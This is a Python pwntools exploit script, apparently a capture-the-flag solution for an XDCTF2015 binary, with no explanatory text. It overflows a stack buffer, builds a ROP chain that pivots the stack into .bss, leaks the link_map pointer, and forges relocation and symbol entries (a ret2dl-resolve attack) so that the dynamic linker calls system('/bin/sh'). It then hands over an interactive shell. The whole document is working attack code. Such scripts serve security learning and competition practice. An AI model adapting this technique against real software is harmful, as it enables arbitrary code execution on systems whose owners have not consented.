#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./a.out"
ENV = {"LD_PRELOAD":"./libc.so.6"}

plt_addr = 0x400510
bss_addr = 0x601050
read_plt = 0x400550
read_got = 0x601030
write_plt = 0x400520
got_plt_addr = 0x601000

pop_rdi_ret = 0x4007b3
pop_rsi_pop_ret = 0x4007b1
pop_rbp_ret = 0x4005e0
leave_ret = 0x4006ab

dynsym_addr = 0x4002c0
dynstr_addr = 0x400398
rel_plt_addr = 0x400470
link_map_ptr = got_plt_addr+0x8

vuln_addr = 0x400676

# fake

fake_stack_addr = bss_addr+0x900
base_addr = fake_stack_addr+0x180
reloc_arg = (base_addr-rel_plt_addr)/0x18
dynsym_off = (base_addr+0x18-dynsym_addr)/0x18
system_off = base_addr+0x30-dynstr_addr
bin_sh_addr = base_addr+0x38
log.info("reloc_arg: "+hex(reloc_arg))

p = process(elf)

p.recvuntil("Welcome to XDCTF2015~!\n") 

#gdb.attach(p)
payload = p8(0)*0x70
payload += p64(fake_stack_addr)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_pop_ret)
payload += p64(link_map_ptr)
payload += p64(0)
payload += p64(write_plt)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_pop_ret)
payload += p64(fake_stack_addr)
payload += p64(0)
payload += p64(read_plt)
payload += p64(leave_ret)
payload += p8(0)*(0x100-len(payload))
p.send(payload)

link_map_addr = u64(p.recv(8))
log.info("link_map_addr: "+hex(link_map_addr))

p.recv(0x100-0x8)

payload = p64(fake_stack_addr+0x300)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_pop_ret)
payload += p64(link_map_addr+0x168)
payload += p64(0)
payload += p64(read_plt)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_pop_ret)
payload += p64(base_addr)
payload += p64(0)
payload += p64(read_plt)
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(plt_addr)    # jump to _dl_runtime_resolve
payload += p64(reloc_arg)   # reloc_arg
payload += p8(0)*(0x100-len(payload))
p.send(payload)

p.send(p8(0)*0x100)

payload = p64(read_got)
payload += p32(0x7)+p32(dynsym_off)
payload += p64(0)
payload += p32(system_off)+p32(0x12)
payload += p64(0)*0x2
payload += "system\x00\x00"
payload += "/bin/sh\x00"
payload += p8(0)*(0x100-len(payload))
p.send(payload)

p.interactive()
